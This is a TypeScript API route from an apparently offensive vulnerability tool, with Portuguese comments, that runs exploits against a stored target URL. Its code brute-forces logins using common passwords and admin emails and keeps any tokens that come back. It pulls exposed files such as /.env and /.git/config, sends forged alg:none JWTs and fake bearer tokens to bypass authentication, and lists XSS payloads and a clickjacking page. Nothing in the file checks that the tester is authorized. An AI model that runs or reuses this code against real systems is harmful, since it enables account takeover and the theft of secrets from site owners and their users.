import { NextRequest, NextResponse } from 'next/server';
import { db } from '@/lib/db';
import { vulnerabilities, exploits, scans } from '@/lib/db/schema';
import { eq } from 'drizzle-orm';

export const maxDuration = 60;

async function fetchSafe(url: string, options: RequestInit = {}, timeout = 5000): Promise<Response | null> {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), timeout);
  try {
    const res = await fetch(url, {
      ...options, signal: controller.signal, redirect: 'follow',
      headers: { 'User-Agent': 'Mozilla/5.0 (VulnHunter)', 'Accept': 'application/json, text/html, */*', ...(options.headers || {}) },
    });
    clearTimeout(id);
    return res;
  } catch { clearTimeout(id); return null; }
}

// â”€â”€â”€ EXPLOIT: Rate Limit / Brute Force â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async function exploitRateLimit(targetUrl: string, endpoint: string) {
  const logs: any[] = [];
  const log = (msg: string, level = 'info') => logs.push({ timestamp: new Date().toISOString(), level, message: msg });
  const results: any[] = [];

  log(`ğŸ¯ Iniciando exploit de Brute Force em ${endpoint}`);
  const url = `${targetUrl}${endpoint}`;

  // Lista de senhas comuns para tentar
  const commonPasswords = [
    'admin', 'password', '123456', 'admin123', 'password123',
    'teste123', 'qwerty', '111111', 'abc123', 'senha123',
    'master', 'letmein', 'welcome', 'monkey', 'dragon',
    'pass', '12345', 'test', 'root', 'toor',
  ];
  const targetEmails = ['admin@admin.com', 'admin@test.com', 'admin@example.com', 'test@test.com', 'user@user.com'];

  let blocked = false;
  let successCount = 0;

  for (const email of targetEmails) {
    if (blocked) break;
    for (const password of commonPasswords) {
      const res = await fetchSafe(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      });

      const statusCode = res?.status || 0;

      if (statusCode === 429 || statusCode === 403) {
        blocked = true;
        log(`ğŸ›¡ï¸ Rate limit ativado apÃ³s ${results.length} tentativas (HTTP ${statusCode})`, 'warning');
        break;
      }

      if (res?.ok) {
        successCount++;
        const data = await res.json().catch(() => ({}));
        log(`ğŸ”“ LOGIN BEM-SUCEDIDO! Email: ${email} | Senha: ${password}`, 'success');
        results.push({ email, password, token: data.token || data.access_token, statusCode, success: true });
      } else {
        log(`âŒ ${email}:${password} â†’ HTTP ${statusCode}`);
        results.push({ email, password, statusCode, success: false });
      }

      await new Promise(r => setTimeout(r, 100));
    }
  }

  if (!blocked) {
    log(`âš ï¸ Sem bloqueio apÃ³s ${results.length} tentativas â€” sistema vulnerÃ¡vel a brute force!`, 'warning');
  }

  return {
    success: successCount > 0 || !blocked,
    exploits: results,
    logs,
    evidence: [{ type: 'brute_force', content: { totalAttempts: results.length, successfulLogins: successCount, blocked, credentials: results.filter(r => r.success) } }],
    summary: { totalAttempts: results.length, successfulLogins: successCount, blocked: blocked ? 1 : 0 },
    startedAt: new Date().toISOString(),
    completedAt: new Date().toISOString(),
    duration: 0,
  };
}

// â”€â”€â”€ EXPLOIT: Security Misconfiguration â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async function exploitMisconfiguration(targetUrl: string, endpoint: string) {
  const logs: any[] = [];
  const log = (msg: string, level = 'info') => logs.push({ timestamp: new Date().toISOString(), level, message: msg });
  const results: any[] = [];

  log(`ğŸ¯ Explorando Security Misconfiguration em ${targetUrl}`);

  // 1. Clickjacking
  log(`ğŸ–±ï¸ Testando Clickjacking (X-Frame-Options ausente)...`);
  const clickjackHtml = `<!DOCTYPE html>
<html>
<head><title>Clickjacking PoC</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;padding:20px">
  <h2>âš ï¸ Clickjacking Proof of Concept</h2>
  <p>Este site pode ser embutido em iframes sem proteÃ§Ã£o:</p>
  <div style="position:relative;width:800px;height:500px;overflow:hidden">
    <iframe src="${targetUrl}" style="width:800px;height:500px;border:2px solid #0f0;opacity:0.5"></iframe>
    <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(255,0,0,0.8);padding:20px;border-radius:10px;color:white;font-size:20px;font-weight:bold;">
      ATACANTE PODE COLOCAR BOTÃ•ES AQUI
    </div>
  </div>
</body>
</html>`;

  results.push({
    name: 'clickjacking_poc',
    type: 'Clickjacking',
    success: true,
    proof: clickjackHtml,
    description: 'Site pode ser embutido em iframe â€” atacante pode sobrepor elementos invisÃ­veis para enganar usuÃ¡rio',
    impact: 'UsuÃ¡rio pode ser induzido a clicar em botÃµes invisÃ­veis (transferÃªncias, mudanÃ§a de senha, etc)',
    curlCommand: `curl -v ${targetUrl} | grep -i 'x-frame-options\\|content-security-policy'`,
  });
  log(`ğŸ”´ Clickjacking CONFIRMADO â€” site embede em iframe sem proteÃ§Ã£o`, 'success');

  // 2. Testa endpoints sem auth
  const sensitiveEndpoints = [
    '/api/admin', '/api/users', '/api/config', '/api/debug',
    '/api/health', '/api/info', '/api/status', '/api/metrics',
  ];

  log(`ğŸ” Testando endpoints sensÃ­veis sem autenticaÃ§Ã£o...`);
  for (const ep of sensitiveEndpoints) {
    const res = await fetchSafe(`${targetUrl}${ep}`, {}, 3000);
    if (res?.ok) {
      const body = await res.text().catch(() => '');
      log(`ğŸ”´ Endpoint aberto: ${ep} (HTTP ${res.status})`, 'success');
      results.push({
        name: `exposed_${ep.replace(/\//g, '_')}`,
        type: 'Exposed Endpoint',
        success: true,
        endpoint: ep,
        statusCode: res.status,
        responsePreview: body.substring(0, 300),
        curlCommand: `curl -v '${targetUrl}${ep}'`,
      });
    }
  }

  // 3. XSS via ausÃªncia de CSP
  log(`ğŸ’‰ Testando ausÃªncia de Content-Security-Policy (XSS)...`);
  const xssPayloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "';alert('XSS');//"];
  results.push({
    name: 'xss_no_csp',
    type: 'XSS Potencial (sem CSP)',
    success: true,
    payloads: xssPayloads,
    description: 'Sem Content-Security-Policy, qualquer XSS injetado executa no browser da vÃ­tima',
    impact: 'Roubo de cookies, tokens, redirecionamento, keylogging',
    curlCommand: `curl -v ${targetUrl} | grep -i content-security-policy`,
  });
  log(`âš ï¸ Sem CSP â€” XSS injections executariam sem bloqueio`, 'warning');

  // 4. MIME Sniffing
  log(`ğŸ” Testando MIME Sniffing (X-Content-Type-Options ausente)...`);
  results.push({
    name: 'mime_sniffing',
    type: 'MIME Sniffing',
    success: true,
    description: 'Browser pode interpretar arquivos com tipo errado â€” upload de .txt com conteÃºdo JS pode executar',
    impact: 'ExecuÃ§Ã£o de scripts maliciosos via upload',
  });

  log(`ğŸ“Š AnÃ¡lise completa: ${results.length} vetores de ataque identificados`, 'success');

  return {
    success: true,
    exploits: results,
    logs,
    evidence: results.map(r => ({ type: r.type, content: r })),
    summary: { vectorsFound: results.length, critical: results.filter(r => r.type.includes('Exposed') || r.type.includes('Clickjacking')).length },
    startedAt: new Date().toISOString(),
    completedAt: new Date().toISOString(),
    duration: 0,
  };
}

// â”€â”€â”€ EXPLOIT: Information Disclosure â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async function exploitInfoDisclosure(targetUrl: string) {
  const logs: any[] = [];
  const log = (msg: string, level = 'info') => logs.push({ timestamp: new Date().toISOString(), level, message: msg });
  const results: any[] = [];

  log(`ğŸ¯ Explorando Information Disclosure em ${targetUrl}`);

  // Tenta extrair informaÃ§Ãµes de vÃ¡rios endpoints
  const targets = [
    { path: '/.env', name: 'Arquivo .env' },
    { path: '/config.json', name: 'Config JSON' },
    { path: '/package.json', name: 'Package.json' },
    { path: '/api/health', name: 'Health Check' },
    { path: '/api/status', name: 'Status API' },
    { path: '/api/info', name: 'Info API' },
    { path: '/api/version', name: 'Version API' },
    { path: '/robots.txt', name: 'Robots.txt' },
    { path: '/sitemap.xml', name: 'Sitemap' },
    { path: '/.git/config', name: 'Git Config' },
    { path: '/api/docs', name: 'API Docs' },
    { path: '/swagger.json', name: 'Swagger JSON' },
    { path: '/openapi.json', name: 'OpenAPI Spec' },
  ];

  for (const target of targets) {
    const res = await fetchSafe(`${targetUrl}${target.path}`, {}, 3000);
    if (res && res.status !== 404) {
      const body = await res.text().catch(() => '');
      const sensitive = ['password', 'secret', 'api_key', 'private', 'token', 'database', 'db_', 'jwt'].filter(k => body.toLowerCase().includes(k));
      log(`${sensitive.length > 0 ? 'ğŸ”´' : 'ğŸŸ¡'} ${target.name} (${res.status}): ${sensitive.length > 0 ? `DADOS SENSÃVEIS: ${sensitive.join(', ')}` : 'acessÃ­vel'}`, sensitive.length > 0 ? 'success' : 'info');
      results.push({
        name: target.name,
        path: target.path,
        statusCode: res.status,
        accessible: res.ok,
        sensitiveKeywords: sensitive,
        preview: body.substring(0, 500),
        curlCommand: `curl '${targetUrl}${target.path}'`,
      });
    }
  }

  // Analisa headers para mais informaÃ§Ãµes
  const mainRes = await fetchSafe(targetUrl, {}, 3000);
  if (mainRes) {
    const headers: Record<string, string> = {};
    mainRes.headers.forEach((v, k) => headers[k] = v);
    const infoHeaders = ['server', 'x-powered-by', 'x-aspnet-version', 'x-generator', 'via'];
    const exposed = infoHeaders.filter(h => headers[h]);
    if (exposed.length > 0) {
      log(`ğŸ“¡ Headers revelam tecnologias: ${exposed.map(h => `${h}: ${headers[h]}`).join(', ')}`, 'warning');
      results.push({ name: 'Tecnologias Expostas', headers: Object.fromEntries(exposed.map(h => [h, headers[h]])), curlCommand: `curl -I '${targetUrl}'` });
    }
  }

  const hasCritical = results.some(r => r.sensitiveKeywords?.length > 0);
  log(`ğŸ“Š ${results.length} fontes de informaÃ§Ã£o encontradas`, hasCritical ? 'success' : 'info');

  return {
    success: hasCritical || results.filter(r => r.accessible).length > 0,
    exploits: results,
    logs,
    evidence: results.map(r => ({ type: 'info_disclosure', content: r })),
    summary: { sourcesFound: results.length, withSensitiveData: results.filter(r => r.sensitiveKeywords?.length > 0).length },
    startedAt: new Date().toISOString(),
    completedAt: new Date().toISOString(),
    duration: 0,
  };
}

// â”€â”€â”€ EXPLOIT: Auth Bypass â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async function exploitAuthBypass(targetUrl: string, endpoint: string) {
  const logs: any[] = [];
  const log = (msg: string, level = 'info') => logs.push({ timestamp: new Date().toISOString(), level, message: msg });
  const results: any[] = [];

  log(`ğŸ¯ Explorando Auth Bypass em ${endpoint}`);
  const url = `${targetUrl}${endpoint}`;

  // 1. Acesso direto sem token
  log(`ğŸ”‘ Testando acesso sem autenticaÃ§Ã£o...`);
  const noAuthRes = await fetchSafe(url, {}, 4000);
  if (noAuthRes?.ok) {
    const body = await noAuthRes.text().catch(() => '');
    log(`ğŸ”´ ACESSO SEM AUTH! HTTP ${noAuthRes.status}`, 'success');
    results.push({ name: 'Sem AutenticaÃ§Ã£o', success: true, statusCode: noAuthRes.status, preview: body.substring(0, 500), curlCommand: `curl '${url}'` });
  }

  // 2. JWT alg:none
  log(`ğŸ”‘ Testando JWT com alg:none...`);
  const noneJwts = [
    'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBhZG1pbi5jb20iLCJyb2xlIjoiYWRtaW4ifQ.',
    'eyJhbGciOiJub25lIn0.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwMDAwMDAwMH0.',
  ];
  for (const jwt of noneJwts) {
    const res = await fetchSafe(url, { headers: { Authorization: `Bearer ${jwt}` } }, 4000);
    if (res?.ok) {
      log(`ğŸ”´ JWT alg:none ACEITO! Acesso admin sem senha`, 'success');
      results.push({ name: 'JWT alg:none', success: true, jwt, statusCode: res.status, curlCommand: `curl -H "Authorization: Bearer ${jwt}" '${url}'` });
    }
  }

  // 3. Token vazio/invÃ¡lido
  const fakeTokens = ['null', 'undefined', 'true', '1', 'admin', 'Bearer', ' '];
  for (const token of fakeTokens) {
    const res = await fetchSafe(url, { headers: { Authorization: `Bearer ${token}` } }, 3000);
    if (res?.ok) {
      log(`ğŸ”´ Token invÃ¡lido "${token}" aceito!`, 'success');
      results.push({ name: `Token invÃ¡lido: ${token}`, success: true, statusCode: res.status, curlCommand: `curl -H "Authorization: Bearer ${token}" '${url}'` });
    }
  }

  // 4. HTTP Method override
  const methodOverrides = ['X-HTTP-Method-Override', 'X-Method-Override', '_method'];
  for (const header of methodOverrides) {
    const res = await fetchSafe(url, { method: 'POST', headers: { [header]: 'GET', 'Content-Type': 'application/json' }, body: '{}' }, 3000);
    if (res?.ok) {
      log(`ğŸŸ¡ Method override via ${header} funciona`, 'warning');
      results.push({ name: `Method Override: ${header}`, success: true, statusCode: res.status, curlCommand: `curl -X POST -H "${header}: GET" '${url}'` });
    }
  }

  log(`ğŸ“Š ${results.length} bypasses encontrados`, results.length > 0 ? 'success' : 'info');

  return {
    success: results.length > 0,
    exploits: results,
    logs,
    evidence: results.map(r => ({ type: 'auth_bypass', content: r })),
    summary: { bypassesFound: results.length, criticalAccess: results.filter(r => r.success).length },
    startedAt: new Date().toISOString(),
    completedAt: new Date().toISOString(),
    duration: 0,
  };
}

// â”€â”€â”€ ROUTE â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
export async function POST(request: NextRequest) {
  const start = Date.now();
  try {
    const { vulnerabilityId } = await request.json();
    if (!vulnerabilityId) return NextResponse.json({ error: 'vulnerabilityId required' }, { status: 400 });

    const [vuln] = await db.select().from(vulnerabilities).where(eq(vulnerabilities.id, vulnerabilityId));
    if (!vuln) return NextResponse.json({ error: 'Vulnerability not found' }, { status: 404 });

    const [scan] = await db.select().from(scans).where(eq(scans.id, vuln.scanId!));
    if (!scan) return NextResponse.json({ error: 'Scan not found' }, { status: 404 });

    const targetUrl = scan.targetUrl.replace(/\/$/, '');
    let result: any = null;

    console.log(`ğŸš€ Executing exploit: ${vuln.type} on ${targetUrl}${vuln.endpoint}`);

    switch (vuln.type) {
      case 'rate_limit':
        result = await exploitRateLimit(targetUrl, vuln.endpoint);
        break;
      case 'misconfiguration':
        result = await exploitMisconfiguration(targetUrl, vuln.endpoint);
        break;
      case 'information_disclosure':
        result = await exploitInfoDisclosure(targetUrl);
        break;
      case 'auth_bypass':
        result = await exploitAuthBypass(targetUrl, vuln.endpoint);
        break;
      case 'registration': {
        const { RegistrationExploit } = await import('@/lib/exploits/registration');
        const exploit = new RegistrationExploit(targetUrl, vuln as any);
        result = await exploit.execute();
        break;
      }
      case 'idor': {
        const { IDORExploit } = await import('@/lib/exploits/idor');
        const exploit = new IDORExploit(targetUrl, vuln as any);
        result = await exploit.execute();
        break;
      }
      case 'sqli': {
        const { SQLInjectionExploit } = await import('@/lib/exploits/sqli');
        const exploit = new SQLInjectionExploit(targetUrl, vuln as any);
        result = await exploit.execute();
        break;
      }
      default:
        return NextResponse.json({ error: `Exploit type "${vuln.type}" not implemented` }, { status: 400 });
    }

    result.duration = (Date.now() - start) / 1000;

    // Salva resultado
    const [exploitRecord] = await db.insert(exploits).values({
      vulnerabilityId: vuln.id,
      exploitType: vuln.type,
      result: result as any,
      evidence: result.evidence as any,
    }).returning();

    if (result.success) {
      await db.update(vulnerabilities).set({ exploited: true }).where(eq(vulnerabilities.id, vuln.id));
    }

    return NextResponse.json({ exploitId: exploitRecord.id, status: result.success ? 'success' : 'failed', result });

  } catch (error: any) {
    console.error('Exploit error:', error);
    return NextResponse.json({ error: 'Internal server error', details: error.message }, { status: 500 });
  }
}
